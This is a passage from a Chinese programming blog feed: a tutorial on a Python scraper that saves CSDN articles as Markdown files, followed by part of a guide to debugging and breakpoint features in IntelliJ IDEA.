function_">filename_filter</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    删除文章标题里面的关键字(通过文章标题设置md文件名)</span><br><span class="hljs-string">    :param filename:</span><br><span class="hljs-string">    :return:</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    filename = re.sub(<span class="hljs-string">&#x27;[\/:*?&quot;&lt;&gt;|]&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, filename)<br>    <span class="hljs-keyword">return</span> filename<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getMd_Title</span>(<span class="hljs-params">title, url=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    得到标题</span><br><span class="hljs-string">    :param title:</span><br><span class="hljs-string">    :return:</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># [toc]md语法，生成目录</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;[toc]&lt;h1 href=&quot;<span class="hljs-subst">&#123;url&#125;</span>&quot;&gt;<span class="hljs-subst">&#123;title&#125;</span>&lt;/h1&gt; &lt;a href=&quot;<span class="hljs-subst">&#123;url&#125;</span>&quot;&gt;原文链接&lt;/a&gt;&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getContent</span>(<span class="hljs-params">url: <span class="hljs-built_in">str</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    得到文章内容</span><br><span class="hljs-string">    :param url:</span><br><span class="hljs-string">    :return:</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    request = urllib.request.Request(url=url, headers=headers)<br>    <span class="hljs-keyword">try</span>:<br>        response = urllib.request.urlopen(request)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;null&#x27;</span><br>    content = response.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-keyword">return</span> content<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getMd_content</span>(<span class="hljs-params">content: <span class="hljs-built_in">str</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    得到md文件的内容</span><br><span class="hljs-string">    :param content:</span><br><span class="hljs-string">    :return:</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 博客文章内容保存在&lt;article&gt;&lt;/article&gt;中</span><br>    start = content.find(<span class="hljs-string">&#x27;&lt;article&#x27;</span>)<br>    end = content.find(<span class="hljs-string">&#x27;article&gt;&#x27;</span>, start)<br>    <span class="hljs-keyword">return</span> content[start: end + <span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;article&gt;&#x27;</span>)]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getOtherurl</span>(<span class="hljs-params">tree</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    得到一篇文章的中链接的其他文章</span><br><span class="hljs-string">    :param tree:</span><br><span class="hljs-string">    :return:</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> tree.xpath(<span class="hljs-string">&#x27;//article[@class=&quot;baidu_pl&quot;]//a/@href&#x27;</span>)<br><br><span class="hljs-comment"># 只下载博客链接内容</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">one</span>(<span class="hljs-params">url: <span class="hljs-built_in">str</span>, theFileLocation=<span class="hljs-string">&#x27;G:\笔记\Typora\python\爬虫\笔记\CSDN\\&#x27;</span>, choose=<span class="hljs-string">&#x27;html2text&#x27;</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    前CSDN文章转化为md文件保存</span><br><span class="hljs-string">    :param url: 博客url</span><br><span class="hljs-string">    :param theFileLocation: md文件保存位置</span><br><span class="hljs-string">    :param choose: html转md库选择</span><br><span class="hljs-string">    :return:</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    content = getContent(url)<br>    <span class="hljs-comment"># 页面没有</span><br>    <span class="hljs-keyword">if</span> content == <span class="hljs-string">&#x27;null&#x27;</span>:<br>        <span class="hljs-keyword">return</span><br>    tree = etree.HTML(content)<br>    title = getTitle(tree)<br>    md_title = getMd_Title(title, url)<br>    md_content = getMd_content(content)<br>    <span class="hljs-keyword">if</span> choose == <span class="hljs-string">&#x27;html2text&#x27;</span>:<br>        markdown = html2text.html2text(md_title + md_content)<br>    <span class="hljs-keyword">else</span>:<br>        markdown = html2markdown.convert(md_title + md_content)<br>    <span class="hljs-comment"># print(markdown)</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(theFileLocation + filename_filter(title) + <span class="hljs-string">&#x27;.md&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        file.write(markdown)<br>    <span class="hljs-built_in">print</span>(title + <span class="hljs-string">&#x27;保存成功！&#x27;</span>)<br><br><span class="hljs-comment"># 博客链接内容和内容中其他博客链接内容</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">more</span>(<span class="hljs-params">url: <span class="hljs-built_in">str</span>, theFileLocation=<span class="hljs-string">&#x27;G:\笔记\Typora\python\爬虫\笔记\CSDN\\&#x27;</span>, choose=<span class="hljs-string">&#x27;html2text&#x27;</span></span>):<br>    content = getContent(url)<br>    tree = etree.HTML(content)<br>    title = getTitle(tree)<br>    md_title = getMd_Title(title)<br>    md_content = getMd_content(content)<br>    <span class="hljs-keyword">if</span> choose == <span class="hljs-string">&#x27;html2text&#x27;</span>:<br>        markdown = html2text.html2text(md_title + md_content)<br>    <span class="hljs-keyword">else</span>:<br>        markdown = html2markdown.convert(md_title + md_content)<br>    theFileLocation += title<br>    <span class="hljs-comment"># 改文件夹是否已经存在</span><br>    exists = os.path.exists(theFileLocation)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> exists:<br>        <span class="hljs-comment"># 不存在，创建文件夹</span><br>        os.makedirs(theFileLocation)<br>    theFileLocation += <span class="hljs-string">&#x27;\\&#x27;</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(theFileLocation + filename_filter(title) + <span class="hljs-string">&#x27;.md&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        file.write(markdown)<br>    <span class="hljs-built_in">print</span>(title + <span class="hljs-string">&#x27;保存成功！&#x27;</span>)<br>    <span class="hljs-comment"># 得到文章中其他csdn连接</span><br>    otherurl = getOtherurl(tree)<br>    <span class="hljs-keyword">for</span> ourl <span class="hljs-keyword">in</span> otherurl:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;csdn&#x27;</span> <span class="hljs-keyword">in</span> ourl:<br>            one(ourl, theFileLocation, choose=choose)<br><br><br><br></code></pre></td></tr></table></figure><h2 id="代码分析"><a class="markdownIt-Anchor" href="#代码分析"></a> 代码分析</h2><h3 id="获取文章标题"><a class="markdownIt-Anchor" href="#获取文章标题"></a> 获取文章标题</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">getTitle</span>(<span class="hljs-params">tree</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    得到文章的标题</span><br><span class="hljs-string">    :param tree:</span><br><span class="hljs-string">    :return:</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    titles = tree.xpath(<span class="hljs-string">&#x27;//h1[@id=&quot;articleContentId&quot;]//text()&#x27;</span>)<br>    <span class="hljs-keyword">return</span> titles[<span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure><p>通过网页源代码分析</p><p>CSDN中博客文章名字在<strong>h1标签</strong>中，并且id属性值为<strong>articleContentId</strong></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221215184025376.png" alt="image-20221215184025376" /></p><h3 id="获取文章内容"><a class="markdownIt-Anchor" href="#获取文章内容"></a> 获取文章内容</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">getMd_content</span>(<span class="hljs-params">content: <span class="hljs-built_in">str</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    得到md文件的内容</span><br><span class="hljs-string">    :param content:</span><br><span class="hljs-string">    :return:</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># 博客文章内容保存在&lt;article&gt;&lt;/article&gt;中</span><br>    start = content.find(<span class="hljs-string">&#x27;&lt;article&#x27;</span>)<br>    end = content.find(<span class="hljs-string">&#x27;article&gt;&#x27;</span>, start)<br>    <span class="hljs-keyword">return</span> content[start: end + <span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;article&gt;&#x27;</span>)]<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221215185553219.png" alt="image-20221215185553219" /></p><p>分析可以得到，文章的内容就是在<code>&lt;article&gt;&lt;/article&gt;</code></p><p>python的<a href="https://so.csdn.net/so/search?q=xpath&amp;spm=1001.2101.3001.7020">xpath</a>没有获取div标签内html内容的功能，也就是获取div或a标签中的innerhtml。所以只能把网页源码当成字符串处理，去找我们需要的那部分内容了。</p><p>使用<a href="https://so.csdn.net/so/search?q=selenium&amp;urw=">selenium</a>可以实现获取div标签内html内容的功能。</p><p>PS：<code>content = browser.find_element(By.CLASS_NAME, &quot;DocReader-module_content_AcIMy&quot;).get_attribute(&quot;innerHTML&quot;)</code></p><h3 id="只下载博客链接内容"><a class="markdownIt-Anchor" href="#只下载博客链接内容"></a> 只下载博客链接内容</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">one</span>(<span class="hljs-params">url: <span class="hljs-built_in">str</span>, theFileLocation=<span class="hljs-string">&#x27;G:\笔记\Typora\python\爬虫\笔记\CSDN\\&#x27;</span>, choose=<span class="hljs-string">&#x27;html2text&#x27;</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    前CSDN文章转化为md文件保存</span><br><span class="hljs-string">    :param url: 博客url</span><br><span class="hljs-string">    :param theFileLocation: md文件保存位置</span><br><span class="hljs-string">    :param choose: html转md库选择</span><br><span class="hljs-string">    :return:</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    content = getContent(url)<br>    <span class="hljs-comment"># 页面没有</span><br>    <span class="hljs-keyword">if</span> content == <span class="hljs-string">&#x27;null&#x27;</span>:<br>        <span class="hljs-keyword">return</span><br>    tree = etree.HTML(content)<br>    title = getTitle(tree)<br>    md_title = getMd_Title(title, url)<br>    md_content = getMd_content(content)<br>    <span class="hljs-keyword">if</span> choose == <span class="hljs-string">&#x27;html2text&#x27;</span>:<br>        markdown = html2text.html2text(md_title + md_content)<br>    <span class="hljs-keyword">else</span>:<br>        markdown = html2markdown.convert(md_title + md_content)<br>    <span class="hljs-comment"># print(markdown)</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(theFileLocation + filename_filter(title) + <span class="hljs-string">&#x27;.md&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        file.write(markdown)<br>    <span class="hljs-built_in">print</span>(title + <span class="hljs-string">&#x27;保存成功！&#x27;</span>)<br></code></pre></td></tr></table></figure><p>根据输入（choose）选择html解析成md的类库，把获取的html代码转化为md格式</p><p>个人觉得<code>html2text</code>好用些</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> choose == <span class="hljs-string">&#x27;html2text&#x27;</span>:<br>    markdown = html2text.html2text(md_title + md_content)<br><span class="hljs-keyword">else</span>:<br>    markdown = html2markdown.convert(md_title + md_content)<br></code></pre></td></tr></table></figure><p>本地文件持久化</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(theFileLocation + filename_filter(title) + <span class="hljs-string">&#x27;.md&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    file.write(markdown)<br></code></pre></td></tr></table></figure><h3 id="获取博客内容中的全部链接"><a class="markdownIt-Anchor" href="#获取博客内容中的全部链接"></a> 获取博客内容中的全部链接</h3><figure class="highlight julia"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs julia">def getOtherurl(tree):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    获取博客内容中的全部链接</span><br><span class="hljs-string">    :param tree:</span><br><span class="hljs-string">    :return:</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> tree.xpath(&#x27;//article[<span class="hljs-meta">@class</span>=<span class="hljs-string">&quot;baidu_pl&quot;</span>]//a/<span class="hljs-meta">@href</span>&#x27;)<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221215192934219.png" alt="image-20221215192934219" /></p><p>前面分析得文章内容就是在 <code>&lt;article&gt;&lt;/article&gt;</code></p><p>获取<code>&lt;article&gt;&lt;/article&gt;</code>全部<code>a</code>子元素的herf属性值，既其他博客链接也肯定被获取到</p><h3 id="下载博客内容和博客内容中其他链接内容只能是csdn博客链接"><a class="markdownIt-Anchor" href="#下载博客内容和博客内容中其他链接内容只能是csdn博客链接"></a> 下载博客内容和博客内容中其他链接内容（只能是csdn博客链接）</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs css"># <br>def more(url: str, theFileLocation=<span class="hljs-string">&#x27;G:\笔记\Typora\python\爬虫\笔记\CSDN\\&#x27;</span>, choose=<span class="hljs-string">&#x27;html2text&#x27;</span>):<br>    content = <span class="hljs-built_in">getContent</span>(url)<br>    tree = etree.<span class="hljs-built_in">HTML</span>(content)<br>    title = <span class="hljs-built_in">getTitle</span>(tree)<br>    md_title = <span class="hljs-built_in">getMd_Title</span>(title)<br>    md_content = <span class="hljs-built_in">getMd_content</span>(content)<br>    if choose == <span class="hljs-string">&#x27;html2text&#x27;</span>:<br>        markdown = html2text.<span class="hljs-built_in">html2text</span>(md_title + md_content)<br>    else:<br>        markdown = html2markdown.<span class="hljs-built_in">convert</span>(md_title + md_content)<br>    theFileLocation += title<br>    # 改文件夹是否已经存在<br>    exists = os.path.<span class="hljs-built_in">exists</span>(theFileLocation)<br>    if not exists:<br>        # 不存在，创建文件夹<br>        os.<span class="hljs-built_in">makedirs</span>(theFileLocation)<br>    theFileLocation += <span class="hljs-string">&#x27;\\&#x27;</span><br>    with <span class="hljs-built_in">open</span>(theFileLocation + <span class="hljs-built_in">filename_filter</span>(title) + <span class="hljs-string">&#x27;.md&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) as file:<br>        file.<span class="hljs-built_in">write</span>(markdown)<br>    <span class="hljs-built_in">print</span>(title + <span class="hljs-string">&#x27;保存成功！&#x27;</span>)<br>    # 得到文章中其他csdn连接<br>    otherurl = <span class="hljs-built_in">getOtherurl</span>(tree)<br>    for ourl in otherurl:<br>        if <span class="hljs-string">&#x27;csdn&#x27;</span> in ourl:<br>            <span class="hljs-built_in">one</span>(ourl, theFileLocation, choose=choose)<br></code></pre></td></tr></table></figure><p>得到博客内容中的全部链接，判断是否是csdn博客链接<code>if 'csdn' in ourl:</code></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 得到文章中其他csdn连接</span><br>otherurl = getOtherurl(tree)<br><span class="hljs-keyword">for</span> ourl <span class="hljs-keyword">in</span> otherurl:<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;csdn&#x27;</span> <span class="hljs-keyword">in</span> ourl:<br>        one(ourl, theFileLocation, <span class="hljs-attribute">choose</span>=choose)<br></code></pre></td></tr></table></figure><h2 id="测试"><a class="markdownIt-Anchor" href="#测试"></a> 测试</h2><h3 id="只下载博客链接内容-2"><a class="markdownIt-Anchor" href="#只下载博客链接内容-2"></a> 只下载博客链接内容</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221215194642407.png" alt="image-20221215194642407" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221215194709114.png" alt="image-20221215194709114" /></p><h3 id="下载博客内容和博客内容中其他链接内容只能是csdn博客链接-2"><a class="markdownIt-Anchor" href="#下载博客内容和博客内容中其他链接内容只能是csdn博客链接-2"></a> 下载博客内容和博客内容中其他链接内容（只能是csdn博客链接）</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221215195529056.png" alt="image-20221215195529056" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221215195547044.png" alt="image-20221215195547044" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221215195605234.png" alt="image-20221215195605234" /></p>]]></content>
    
    
    <categories>
      
      <category>爬虫</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>爬虫</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>实用的 IDEA Debug 调试技巧</title>
    <link href="/2022/12/14/%E5%AE%9E%E7%94%A8%E7%9A%84%20IDEA%20Debug%20%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7/"/>
    <url>/2022/12/14/%E5%AE%9E%E7%94%A8%E7%9A%84%20IDEA%20Debug%20%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7/</url>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="实用的-idea-debug-调试技巧"><a class="markdownIt-Anchor" href="#实用的-idea-debug-调试技巧"></a> 实用的 IDEA Debug 调试技巧</h1><h3 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h3><p>Debug 是程序员的开发神器，使用好了可以帮助我们非常高效的工作、学习、排查问题等。毫不客气的说，是决定我们进阶到更高层级的一个重要技能。</p><ol><li><code>神秘大佬A</code>：调试技巧比编码技巧<strong>更为重要</strong>，因为花费在调试上的时间往往比编码还多，学到的东西比编码中学到的更丰富</li><li><code>神秘大佬B</code>：调试技能重要性甚⾄<strong>超过</strong>学习⼀门语⾔</li><li><code>神秘大佬C</code>：不会调试的程序员，<strong>肯定</strong>编制不出任何好的软件</li></ol><h3 id="正文"><a class="markdownIt-Anchor" href="#正文"></a> 正文</h3><h2 id="debug-的常见使用场景"><a class="markdownIt-Anchor" href="#debug-的常见使用场景"></a> Debug 的常见使用场景</h2><ul><li>需求代码测试：通过debug你才能知道你的代码究竟是怎么运行的，更容易发现问题</li><li>问题排查：只要能进入到问题流程的debug，就没有排查不了的问题</li><li>源码学习：源码通常很庞大，通过Debug 我们能更清晰的知道执行到哪个地方，执行时的各个变量数据</li></ul><h3 id="基本界面"><a class="markdownIt-Anchor" href="#基本界面"></a> <strong>基本界面</strong></h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214193202245.png" alt="image-20221214193202245" /></p><p>① 以Debug模式启动服务，左边的一个按钮则是以Run模式启动。在开发中，我一般会直接启动Debug模式，方便随时调试代码。</p><p>② 断点：在左边行号栏单击左键，或者快捷键Ctrl+F8 打上/取消断点，断点行的颜色可自己去设置。</p><p>③ Debug窗口：访问请求到达第一个断点后，会自动激活Debug窗口。如果没有自动激活，可以去设置里设置。</p><p>④ 调试按钮：一共有8个按钮，调试的主要功能就对应着这几个按钮，鼠标悬停在按钮上可以查看对应的快捷键。</p><p>⑤ 服务按钮：可以在这里关闭/启动服务，设置断点等。</p><p>⑥ 方法调用栈：这里显示了该线程调试所经过的所有方法，勾选右上角的[Show All Frames]按钮，就不会显示其它类库的方法了，否则这里会有一大堆的方法。</p><p>⑦ Variables：在变量区可以查看当前断点之前的当前方法内的变量。</p><p>⑧  Watches：查看变量，可以将Variables区中的变量拖到Watches中查看。</p><h3 id="基础操作"><a class="markdownIt-Anchor" href="#基础操作"></a> 基础操作</h3><pre><code class="hljs">1. Step over(F8)：程序往下执行一行2. Step into(F7)：进入方法内，可以进入自定义方法或三方库方法，JDK方法无法进入3. Force step into(Alt+Shift+F7)：强制进入方法内，一般 Step into 进不去时可以使用4. Step out(Shift+F8)：退出方法，跟（force）step into 配合使用5. Resume Program(F9)：恢复运行程序，运行到下一个断点的地方  6. 5个操作从上往下分别对应下图的1-5，这也是 Debug 最常用的几个基础操作。  </code></pre><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214160315800.png" alt="image-20221214160315800" /></p><ol><li><strong>Line breakpoint（行断点）</strong>：在指定代码行设置断点，属于行级别的断点</li><li><strong>Temporary line breakpoint（临时行断点）</strong>：与行断点类似，不同之处在于该类型的断点在被激活之后会被立即删除</li><li><strong>Field watchpoint（属性断点）</strong>：读取或者修改属性时会激活属性断点</li><li><strong>Method breakpoint（方法断点）</strong>：它是标记在方法那一行的断点，有自己特有的属性参数</li><li><strong>Exception breakpoint（异常断点）</strong>：当程序抛出指定异常时会激活异常断点。与行断点不同，异常断点不需要与源代码映射（不需要打在具体某一行代码上），因为异常断点应用程序级别的</li></ol><p>​<img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214175428616.png" alt="image-20221214175428616" /></p><p>Suspend：有没有让你诧异到，它竟然是个复选框并且还可以不被选中。若它不被选中的话断点的相关动作依然激活执行，只是线程不会被组塞了而已。它的两种阻塞策略如下：</p><p><strong>All</strong>：阻塞该程序内所有线程（默认）</p><p><strong>Thread</strong>：只阻塞当前断点所在线程（在多线程调试、远程调试中强烈建议使用这种方式）<br /><strong>Condition</strong>：这就是所谓的条件断点，只有书写的表达式返回true时候断点才会被激活</p><p><strong>Log</strong>：</p><ul><li>勾选&quot;Breakpoint hit message&quot;：断点激活时输出提示日志</li><li>勾选&quot;Stack trace&quot;：断点激活时输出程序调用栈信息</li><li>勾选&quot;Evaluate and log&quot;：并在下面的输入框中输入&quot;args&quot;，断点激活时会计算并输出变量 args 的值</li><li>他哥三是可以同时被勾选的（因为都是复选框~）</li></ul><h2 id="行断点line-breakpoints"><a class="markdownIt-Anchor" href="#行断点line-breakpoints"></a> 行断点（Line Breakpoints）</h2><p>图标：红色圆形</p><p>功能：最常用的断点，在断点所在行进行暂停。<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214160648099.png" alt="image-20221214160648099" /><br />理论上只要有行断点和上面的基本操作，就可以完成大部分的 Debug<br />调试了，但是很多场景下只使用这些功能，调试是很低效了，接下来我们将依次介绍各种好用的调试技巧。</p><h2 id="方法断点method-breakpoint"><a class="markdownIt-Anchor" href="#方法断点method-breakpoint"></a> 方法断点（Method Breakpoint）</h2><p>图标：红色菱形</p><p>功能：在方法入口（entry）和出口（exit）都会自动暂停，Emulated，目前没有发现有啥卵用（菜逼的忧伤😓😓😓）。在方法入口暂停可以让我们从头调试整个方法，而在方法出口处暂停可以让我们看到方法执行完毕时，方法内各个变量的数据情况。</p><p>有时候我们的一个接口会存在很多实现类，我们短时间内难以分析究竟是运行到了哪个实现类中，这个时候就可以使用方法断点，我们将断点打在接口方法上，运行到该方法时，会自动跳到实际执行的实现类，无需通过上下文环境去分析是哪个实现类。</p><p>缺点：可能会大大降低debug速度<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214160754572.png" alt="image-20221214160754572" /></p><h2 id="字段断点field-watchpoints"><a class="markdownIt-Anchor" href="#字段断点field-watchpoints"></a> 字段断点（Field Watchpoints）</h2><p>图标：红色眼睛</p><p>功能：在字段发生变更（默认）或者被访问（需要额外设置）时暂停。</p><p>如果我们想知道某个属性在什么时候被修改，从入口处开始调试太麻烦，我们可以直接在字段上打上字段断点，这样字段被修改的时候就会自动暂停。</p><p>而如果我们想在字段被访问时也暂停，则可以右键字段断点，将【Field access】勾选上即可。<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214160825610.png" alt="image-20221214160825610" /></p><h2 id="异常断点exception-breakpoints"><a class="markdownIt-Anchor" href="#异常断点exception-breakpoints"></a> 异常断点（Exception Breakpoints）</h2><p>图标：红色闪电</p><p>功能：可以在抛出异常的地方进行暂停</p><p>异常断点是无需在具体的代码上打断点的，而是在断点详情页中直接添加，后续在执行时，如果抛出我们监听的异常，则会自动暂停在抛出异常的地方。<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214162657053.png" alt="image-20221214162657053" /><br />这个<code>Any exception</code></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214162758993.png" alt="image-20221214162758993" /></p><p>捕获的异常不太对啊 ，用<strong>Resume Program</strong>跳了很多步。都没有找到<code>java.lang.ArithmeticException</code></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214163305235.png" alt="image-20221214163305235" /></p><p>还是直接指定异常使用比较好。</p><p>但是同理，它也提供一个特有的断点参数：</p><ul><li><code>Notification</code>：<br />- “Catch excetion”：程序在捕获（Try Catch）这个异常时激活断点<br />- “Uncatch excetion”：不catch捕获异常时激活断点</li></ul><h2 id="主动抛异常throw-exception"><a class="markdownIt-Anchor" href="#主动抛异常throw-exception"></a> 主动抛异常（Throw Exception）</h2><p>图标：无，Frames 堆栈中右键显示</p><p>功能：主动抛出指定异常</p><p>在上面的例子中，我们通过代码构造了一个异常，但是这种方式其实是不太方便的，特别是如果我们想在远程环境抛出一个异常，需要修改代码重新部署，测试完后还要修改回来再次部署。而</p><p>Throw Exception 则可以直接抛出一个异常，避免了这些繁琐的流程。  （感觉没啥用）</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214171751405.png" alt="image-20221214171751405" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214171801643.png" alt="image-20221214171801643" /></p><h2 id="降帧drop-frame"><a class="markdownIt-Anchor" href="#降帧drop-frame"></a> 降帧（Drop Frame）</h2><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221214172440724.png" alt="image-20221214172440724" /><br />功能：当我们 Debug 从 A 方法进入 B 方法时，通过降帧（退帧）可以返回到调用 B 方法前，这样我们就可以再一次调用 B 方法。</p><p>通常用于当我们快执行完 B 方法后，发现某个重要流程被我们跳过了，想再看一下，则此时可以先回退到 A 方法，然后再次进入 B 方法。</p><p>我们知道方法的执行和结束在 JVM 中对应的是栈帧的入栈和出栈，因此栈帧描述的就是方法对应的模型，而降帧（退帧）则对应的就是回退到上一个方法。</p><h2 id="断点条件condition"><a class="markdownIt-Anchor" href="#断点条件condition"></a> 断点条件（Condition）</h2><p>功能：当程序执行到断点位置时，需要 Condition 中的表达式返回 true，才会暂停，否则会直接跳过。</p><p>用于断点所在的地方执行次数过多时，避免浪费时间在不想关注的流程上。例如我们有一个 Spring bean 的初始化存在问题，我们想跳过其他 bean的初始化流程，则可以在初始化的入口设置 beanName.equals(“”) 